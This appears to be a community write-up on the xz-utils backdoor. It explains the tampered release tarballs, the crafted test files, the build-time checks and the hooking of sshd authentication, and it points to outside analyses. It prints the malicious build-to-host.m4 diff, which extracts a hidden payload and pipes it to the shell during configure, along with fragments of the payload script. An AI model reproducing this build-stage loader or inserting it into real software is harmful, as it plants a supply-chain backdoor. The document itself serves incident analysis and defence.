<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Design</h2><a id="user-content-design" class="anchor" aria-label="Permalink: Design" href="#design"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">This backdoor has several components. At a high level:</p>
<ul dir="auto">
<li>The release tarballs upstream publishes don't have the same code
that GitHub has. This is common in C projects so that downstream
consumers don't need to remember how to run autotools and autoconf.
The version of <code>build-to-host.m4</code> in the release tarballs differs
wildly from the upstream on GitHub.</li>
<li>There are crafted test files in the <code>tests/</code> folder within the git repository too.
These files are in the following commits:
<ul dir="auto">
<li><code>tests/files/bad-3-corrupt_lzma2.xz</code> (<a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0</a>, <a href="https://github.com/tukaani-project/xz/commit/74b138d2a6529f2c07729d7c77b1725a8e8b16f1">74b138d2a6529f2c07729d7c77b1725a8e8b16f1</a>)</li>
<li><code>tests/files/good-large_compressed.lzma</code>
(<a href="https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0</a>,
<a href="https://github.com/tukaani-project/xz/commit/74b138d2a6529f2c07729d7c77b1725a8e8b16f1">74b138d2a6529f2c07729d7c77b1725a8e8b16f1</a>)</li>
</ul>
</li>
<li>Note that the bad commits have since been reverted in <a href="https://github.com/tukaani-project/xz/commit/e93e13c8b3bec925c56e0c0b675d8000a0f7f754">e93e13c8b3bec925c56e0c0b675d8000a0f7f754</a></li>
<li>A script called by <code>build-to-host.m4</code> that unpacks this malicious
test data and uses it to modify the build process.</li>
<li>IFUNC, a mechanism in glibc that allows for indirect function calls,
is used to perform runtime hooking/redirection of OpenSSH's
authentication routines. IFUNC is a tool that is normally used for
legitimate things, but in this case it is exploited for this attack
path.</li>
</ul>
<p dir="auto">Normally upstream publishes release tarballs that are different than
the automatically generated ones in GitHub. In these modified
tarballs, a malicious version of <code>build-to-host.m4</code> is included to
execute a script during the build process.</p>
<p dir="auto">This script (at least in versions 5.6.0 and 5.6.1) checks for various
conditions like the architecture of the machine. Here is a snippet of
the malicious script that gets unpacked by <code>build-to-host.m4</code> and an
explanation of what it does:</p>
<blockquote>
<p dir="auto"><code>if ! (echo "$build" | grep -Eq "^x86_64" &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo "$build" | grep -Eq "linux-gnu$" &gt; /dev/null 2&gt;&amp;1);then</code></p>
</blockquote>
<ul dir="auto">
<li>If amd64/x86_64 is the target of the build</li>
<li>And if the target uses the name <code>linux-gnu</code> (mostly checks for the
use of glibc)</li>
</ul>
<p dir="auto">It also checks for the toolchain being used:</p>
<blockquote>
<pre><code>  if test "x$GCC" != 'xyes' &gt; /dev/null 2&gt;&amp;1;then
  exit 0
  fi
  if test "x$CC" != 'xgcc' &gt; /dev/null 2&gt;&amp;1;then
  exit 0
  fi
  LDv=$LD" -v"
  if ! $LDv 2&gt;&amp;1 | grep -qs 'GNU ld' &gt; /dev/null 2&gt;&amp;1;then
  exit 0
</code></pre>
</blockquote>
<p dir="auto">And if you are trying to build a Debian or Red Hat package:</p>
<blockquote>
<p dir="auto"><code>if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then</code></p>
</blockquote>
<p dir="auto">This attack thusly seems to be targeted at amd64 systems running glibc
using either Debian or Red Hat derived distributions. Other systems
may be vulnerable at this time, but we don't know.</p>
<p dir="auto">Lasse Collin, the original long-standing xz maintainer, is currently working on
auditing the <code>xz.git</code>.</p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Design specifics</h2><a id="user-content-design-specifics" class="anchor" aria-label="Permalink: Design specifics" href="#design-specifics"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-diff" dir="auto"><pre>$ git diff m4/build-to-host.m4 ~/data/xz/xz-5.6.1/m4/build-to-host.m4
<span class="pl-c1">diff --git a/m4/build-to-host.m4 b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4</span>
index f928e9ab..d5ec3153 100644
<span class="pl-md">--- a/m4/build-to-host.m4</span>
<span class="pl-mi1">+++ b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4</span>
<span class="pl-mdr">@@ -1,4 +1,4 @@</span>
<span class="pl-md"><span class="pl-md">-</span># build-to-host.m4 serial 3</span>
<span class="pl-mi1"><span class="pl-mi1">+</span># build-to-host.m4 serial 30</span>
 dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
<span class="pl-mdr">@@ -37,6 +37,7 @@</span> AC_DEFUN([gl_BUILD_TO_HOST],
 
   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
<span class="pl-mi1"><span class="pl-mi1">+</span>  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`</span>
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
<span class="pl-mdr">@@ -58,14 +59,40 @@</span> AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
<span class="pl-mi1"><span class="pl-mi1">+</span>  if test "x$gl_am_configmake" != "x"; then</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null'</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  else</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>    gl_[$1]_config=''</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  fi</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  _LT_TAGDECL([], [gl_path_map], [2])dnl</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  _LT_TAGDECL([], [gl_am_configmake], [2])dnl</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  _LT_TAGDECL([], [[$1]_c_make], [2])dnl</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl</span>
   AC_SUBST([$1_c_make])
<span class="pl-mi1"><span class="pl-mi1">+</span></span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  dnl If the host conversion code has been placed in $gl_config_gt,</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  dnl instead of duplicating it all over again into config.status,</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  dnl then we will have config.status run $gl_config_gt later, so it</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  dnl needs to know what name is stored there:</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2&gt;/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])</span>
 ])
 
 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
<span class="pl-mi1"><span class="pl-mi1">+</span>  dnl Search for Automake-defined pkg* macros, in the order</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  dnl listed in the Automake 1.10a+ documentation.</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2&gt;/dev/null`</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  if test -n "$gl_am_configmake"; then</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>    HAVE_PKG_CONFIGMAKE=1</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  else</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>    HAVE_PKG_CONFIGMAKE=0</span>
<span class="pl-mi1"><span class="pl-mi1">+</span>  fi</span>
<span class="pl-mi1"><span class="pl-mi1">+</span></span>
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
<span class="pl-mi1"><span class="pl-mi1">+</span>  gl_path_map='tr "\t \-_" " \t_\-"'</span>
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&amp;'();&lt;&gt;\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl</pre></div>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Payload</h2><a id="user-content-payload" class="anchor" aria-label="Permalink: Payload" href="#payload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">If those conditions check, the payload is injected into the source
tree. We have not analyzed this payload in detail. Here are the main
things we know:</p>
<ul dir="auto">
<li>
<p dir="auto">The payload activates if the running program has the process
name <code>/usr/sbin/sshd</code>. Systems that put <code>sshd</code> in
<code>/usr/bin</code> or another folder may or may not be vulnerable.</p>
</li>
<li>
<p dir="auto">It may activate in other scenarios too, possibly even unrelated to ssh.</p>
</li>
<li>
<p dir="auto">We don't entirely know the payload is intended to do. We are
investigating.</p>
</li>
<li>
<p dir="auto">Successful exploitation does not generate any log entries.</p>
</li>
<li>
<p dir="auto">Vanilla upstream OpenSSH isn't affected unless one of its
dependencies links <code>liblzma</code>.</p>
<ul dir="auto">
<li>Lennart Poettering had <a href="https://news.ycombinator.com/item?id=39867126" rel="nofollow">mentioned</a> that it may happen
via pam-&gt;libselinux-&gt;liblzma, and possibly in other cases too, but...</li>
<li>libselinux does not link to liblzma. It turns out the confusion was because of an old downstream-only patch in Fedora and a stale dependency in the RPM spec which persisted long-beyond its removal.</li>
<li>PAM modules are loaded too late in the process AFAIK for this to work (another possible example was <code>pam_fprintd</code>). Solar Designer <a href="https://openwall.com/lists/oss-security/2024/03/31/9" rel="nofollow">raised this issue</a> as well on <em>oss-security</em>.</li>
</ul>
</li>
<li>
<p dir="auto">The payload is loaded into <code>sshd</code> indirectly. <code>sshd</code> is often patched
to support
<a href="https://www.freedesktop.org/software/systemd/man/249/systemd-notify.html" rel="nofollow">systemd-notify</a>
so that other services can start when sshd is running. <code>liblzma</code> is
loaded because it's depended on by other parts of <code>libsystemd</code>. This
is not the fault of systemd, this is more unfortunate. The patch
that most distributions use is available here:
<a href="https://github.com/openssh/openssh-portable/pull/375" data-hovercard-type="pull_request" data-hovercard-url="/openssh/openssh-portable/pull/375/hovercard">openssh/openssh-portable#375</a>.</p>
<ul dir="auto">
<li><em>Update</em>: The OpenSSH developers have added <a href="https://bugzilla.mindrot.org/show_bug.cgi?id=2641#c33" rel="nofollow">non-library integration</a> of the systemd-notify protocol so distributions won't be patching it in via <code>libsystemd</code> support anymore. This change has been committed and will land in OpenSSH-9.8, due around June/July 2024.</li>
</ul>
</li>
<li>
<p dir="auto">If this payload is loaded in openssh <code>sshd</code>, the
<code>RSA_public_decrypt</code> function will be redirected into a malicious
implementation. We have observed that this malicious implementation
can be used to bypass authentication. <del>Further research is being done
to explain why.</del></p>
<ul dir="auto">
<li>Filippo Valsorda has shared <a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b" rel="nofollow">analysis</a> indicating that the attacker must supply a key which is verified by the payload and then attacker input is passed to <code>system()</code>, giving remote code execution (RCE).</li>
</ul>
</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Tangential xz bits</h2><a id="user-content-tangential-xz-bits" class="anchor" aria-label="Permalink: Tangential xz bits" href="#tangential-xz-bits"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li>
<p dir="auto">Jia Tan's <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7" rel="nofollow">328c52da8a2bbb81307644efdb58db2c422d9ba7</a> commit contained a <code>.</code> in the CMake check for landlock sandboxing support. This caused the check to always fail so landlock support was detected as absent.</p>
<ul dir="auto">
<li>Hardening of CMake's <code>check_c_source_compiles</code> has been proposed (see <em>Other projects</em>).</li>
</ul>
</li>
<li>
<p dir="auto">IFUNC was introduced for <em>crc64</em> in <a href="https://git.tukaani.org/?p=xz.git;a=commit;h=ee44863ae88e377a5df10db007ba9bfadde3d314" rel="nofollow">ee44863ae88e377a5df10db007ba9bfadde3d314</a> by <em>Hans Jansen</em>.</p>
<ul dir="auto">
<li><em>Hans Jansen</em> later went on to ask Debian to update xz-utils in <a href="https://bugs.debian.org/1067708" rel="nofollow">https://bugs.debian.org/1067708</a>, but this is quite a common thing for eager users to do, so it's not necessarily nefarious.</li>
</ul>
</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">People</h2><a id="user-content-people" class="anchor" aria-label="Permalink: People" href="#people"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">We do not want to speculate on the people behind this project in this
document. This is not a productive use of our time, and law
enforcement will be able to handle identifying those responsible. They
are likely patching their systems too.</p>
<p dir="auto">xz-utils had two maintainers:</p>
<ul dir="auto">
<li>Lasse Collin (<em>Larhzu</em>) who has maintained xz since the beginning
(~2009), and before that, <code>lzma-utils</code>.</li>
<li>Jia Tan (<em>JiaT75</em>) who started contributing to xz in the last 2-2.5
years and gained commit access, and then release manager rights,
about 1.5 years ago. He was removed on 2024-03-31 as Lasse begins
his long work ahead.</li>
</ul>
<p dir="auto">Lasse regularly has internet breaks and was on one of these
as this all kicked off. He has posted an update
at <a href="https://tukaani.org/xz-backdoor/" rel="nofollow">https://tukaani.org/xz-backdoor/</a> and is working with the community.</p>
<p dir="auto">Please be patient with him as he gets up to speed and takes time
to analyse the situation carefully.</p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Misc notes</h2><a id="user-content-misc-notes" class="anchor" aria-label="Permalink: Misc notes" href="#misc-notes"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li><a href="https://jmmv.dev/2023/07/ldd-untrusted-binaries.html" rel="nofollow">Please <strong>do not</strong> use <code>ldd</code> on untrusted binaries</a>
<ul dir="auto">
<li><a href="https://lore.kernel.org/linux-man/20231016061923.105814-1-siddhesh@gotplt.org/t/#u" rel="nofollow">[PATCH] ldd: Do not recommend binutils as the safer option</a></li>
</ul>
</li>
<li><a href="https://web.archive.org/web/*/https://github.com/tukaani-project/xz/releases/download/*" rel="nofollow">Internet Archive has a collection of the release tarballs</a></li>
<li>I've also created a git repo for my own convenience at <a href="https://github.com/thesamesam/xz-archive">https://github.com/thesamesam/xz-archive</a>.</li>
<li>Lasse Collin's in-progress <a href="https://tukaani.org/xz-backdoor/review.html" rel="nofollow">review notes</a> as he audits xz.git</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Analysis of the payload</h2><a id="user-content-analysis-of-the-payload" class="anchor" aria-label="Permalink: Analysis of the payload" href="#analysis-of-the-payload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">This is the part which is very much in flux. It's early days yet.</p>
<p dir="auto">These two especially do a great job of analysing the initial/bash stages:</p>
<ul dir="auto">
<li><a href="https://gynvael.coldwind.pl/?lang=en&amp;id=782" rel="nofollow">xz/liblzma: Bash-stage Obfuscation Explained</a> by @gynvael</li>
<li><a href="https://research.swtch.com/xz-script" rel="nofollow">The xz attack shell script</a> by Russ Cox</li>
</ul>
<p dir="auto">Other great resources:</p>
<ul dir="auto">
<li><a href="https://bsky.app/profile/did:plc:x2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b" rel="nofollow">Filippo Valsorda's bluesky thread</a></li>
<li><a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504">XZ Backdoor Analysis (WIP)</a> by @smx-smx
<ul dir="auto">
<li><a href="https://github.com/smx-smx/xzre">XZ backdoor reverse engineering - git repo</a></li>
</ul>
</li>
<li><a href="https://github.com/Midar/xz-backdoor-documentation/wiki">xz backdoor documentation wiki</a> by @Midar et. al</li>
<li><a href="https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4">modify_ssh_rsa_pubkey.py</a> - script to trigger more parts of the payload in a compromised <code>sshd</code> by @keeganryan</li>
<li><a href="https://github.com/karcherm/xz-malware">xz-malware</a> by @karcherm</li>
<li><a href="https://github.com/hamarituc/xz-backdoor">xz-backdoor</a> by @hamarituc</li>
<li><a href="https://github.com/amlweems/xzbot">xzbot: notes, honeypot, and exploit demo</a> by @amlweems. This contains binary patching for the key!</li>
<li><a href="https://github.com/0xlane/xz-cve-2024-3094">XZ Backdoor Extract</a> by @0xlane</li>
<li><a href="https://github.com/blasty/JiaTansSSHAgent">https://github.com/blasty/JiaTansSSHAgent</a></li>
<li><a href="https://securelist.com/xz-backdoor-story-part-1/112354" rel="nofollow">XZ backdoor story – Initial analysis</a> (part 1) by Kaspersky
<ul dir="auto">
<li><a href="https://securelist.com/xz-backdoor-story-part-2-social-engineering/112476/" rel="nofollow">Assessing the Y, and How, of the XZ Utils incident</a> (part 2) by Kaspersky</li>
</ul>
</li>
<li><a href="https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor">liblzma.so infection</a> by binarly.io</li>
<li><a href="https://github.com/felipec/xz-min">Minimal setup to trigger the xz backdoor</a> by @felipec</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Other projects</h2><a id="user-content-other-projects" class="anchor" aria-label="Permalink: Other projects" href="#other-projects"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">There are concerns some other projects are affected (either by themselves or changes to other projects were made to facilitate the xz backdoor). I want to avoid a witch-hunt but listing some examples here which are already been linked widely to give some commentary.</p>
<ul dir="auto">
<li>
<p dir="auto">libarchive is being checked out:</p>
<ul dir="auto">
<li><a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="2216599374" data-permission-text="Title is private" data-url="https://github.com/libarchive/libarchive/issues/2103" data-hovercard-type="issue" data-hovercard-url="/libarchive/libarchive/issues/2103/hovercard" href="https://github.com/libarchive/libarchive/issues/2103">libarchive/libarchive#2103</a> coordinates the review effort</li>
<li><a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="1042469982" data-permission-text="Title is private" data-url="https://github.com/libarchive/libarchive/issues/1609" data-hovercard-type="pull_request" data-hovercard-url="/libarchive/libarchive/pull/1609/hovercard" href="https://github.com/libarchive/libarchive/pull/1609">libarchive/libarchive#1609</a> was made by Jia Tan
<ul dir="auto">
<li><a href="https://openwall.com/lists/oss-security/2024/03/31/11" rel="nofollow">Solar Designer's take</a> - with an interesting discussion about how terminal applications should act here</li>
<li>The initial fix post-review for this was <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="2215984583" data-permission-text="Title is private" data-url="https://github.com/libarchive/libarchive/issues/2101" data-hovercard-type="pull_request" data-hovercard-url="/libarchive/libarchive/pull/2101/hovercard" href="https://github.com/libarchive/libarchive/pull/2101">libarchive/libarchive#2101</a> (<a href="https://github.com/libarchive/libarchive/commit/6110e9c82d8ba830c3440f36b990483ceaaea52c">https://github.com/libarchive/libarchive/commit/6110e9c82d8ba830c3440f36b990483ceaaea52c</a>).</li>
<li>After review, <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="2215984583" data-permission-text="Title is private" data-url="https://github.com/libarchive/libarchive/issues/2101" data-hovercard-type="pull_request" data-hovercard-url="/libarchive/libarchive/pull/2101/hovercard" href="https://github.com/libarchive/libarchive/pull/2101">libarchive/libarchive#2101</a> was made by libarchive maintainers.</li>
<li>It doesn't appear exploitable but the change in <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="2215984583" data-permission-text="Title is private" data-url="https://github.com/libarchive/libarchive/issues/2101" data-hovercard-type="pull_request" data-hovercard-url="/libarchive/libarchive/pull/2101/hovercard" href="https://github.com/libarchive/libarchive/pull/2101">libarchive/libarchive#2101</a> was made out of caution.</li>
<li>One of the libarchive maintainers has filed <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="2218617196" data-permission-text="Title is private" data-url="https://github.com/libarchive/libarchive/issues/2107" data-hovercard-type="issue" data-hovercard-url="/libarchive/libarchive/issues/2107/hovercard" href="https://github.com/libarchive/libarchive/issues/2107">libarchive/libarchive#2107</a> to discuss a better fix as well.</li>
</ul>
</li>
</ul>
</li>
<li>
<p dir="auto"><a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="1793585804" data-permission-text="Title is private" data-url="https://github.com/google/oss-fuzz/issues/10667" data-hovercard-type="pull_request" data-hovercard-url="/google/oss-fuzz/pull/10667/hovercard" href="https://github.com/google/oss-fuzz/pull/10667">google/oss-fuzz#10667</a> was made by Jia Tan to disable IFUNC in oss-fuzz when testing xz-utils</p>
<ul dir="auto">
<li>It is unclear if this was safe or not. Obviously, it doesn't look great, but see below.</li>
<li>Note that IFUNC <em>is</em> a brittle mechanism and it is known to be sensitive to e.g. ASAN, which is why the change didn't raise alarm bells. i.e. It is possible that such a change was genuinely made in good faith, although it's of course suspicious in hindsight. But I wouldn't say the oss-fuzz maintainers should have rejected it, either.
<ul dir="auto">
<li>gcc <a href="https://gcc.gnu.org/PR70082" rel="nofollow">PR70082</a></li>
<li>gcc <a href="https://gcc.gnu.org/PR87482" rel="nofollow">PR87482</a></li>
<li>gcc <a href="https://gcc.gnu.org/PR110442" rel="nofollow">PR110442</a></li>
<li>gcc <a href="https://gcc.gnu.org/PR114115" rel="nofollow">PR114115</a> - a real bug which xz found(!)</li>
</ul>
</li>
</ul>
</li>
</ul>
